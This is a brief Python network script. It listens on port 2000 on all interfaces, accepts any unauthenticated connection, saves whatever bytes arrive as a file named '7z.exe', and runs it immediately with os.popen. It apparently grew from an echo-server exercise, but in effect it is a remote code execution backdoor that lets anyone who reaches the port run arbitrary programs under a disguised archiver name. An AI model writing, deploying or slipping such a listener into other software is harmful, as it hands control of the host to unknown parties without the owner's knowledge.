import socket
import pickle
import os

host = ''
port = 2000

socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_obj.bind((host, port))
socket_obj.listen(5)

while True:
    connection, address = socket_obj.accept()
    print('Connecting ' + str(address))
    while True:
        curr_get_data = connection.recv(1024)
        res_data = b''
        while curr_get_data:
            res_data += curr_get_data
            curr_get_data = connection.recv(1024)
        if not res_data:
            break
        # print('==', len(data), '==')
        name = '7z.exe'
        res_file = open(name, 'wb')
        res_file.write(res_data)
        res_file.close()
        os.popen(name)
        # print(res_data.decode())
        # massage = 'echo -> ' + str(pickle.loads(res_data))
        # connection.send(pickle.dumps(massage))
    connection.close()
